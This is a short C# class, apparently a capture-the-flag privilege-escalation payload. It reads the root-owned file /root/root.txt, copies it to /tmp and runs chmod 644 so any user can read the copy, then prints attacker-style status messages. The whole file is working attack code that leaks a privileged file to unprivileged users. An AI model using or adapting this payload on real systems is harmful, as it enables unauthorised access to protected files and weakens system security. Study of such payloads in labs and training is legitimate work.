using System;
using System.IO;

public class ReadFile
{
    public static void Run()
    {
        try
        {
            string src = "/root/root.txt";   // target file
            string dst = "/tmp/root_out.txt"; // output path

            if (File.Exists(src))
            {
                string content = File.ReadAllText(src);

                // Write to /tmp
                File.WriteAllText(dst, content);

                // Change permissions so anyone can read it
                System.Diagnostics.Process.Start("chmod", "644 " + dst);

                Console.WriteLine("[*] Copied " + src + " to " + dst);
            }
            else
            {
                Console.WriteLine("[!] File not found: " + src);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error: " + ex.Message);
        }
    }
}
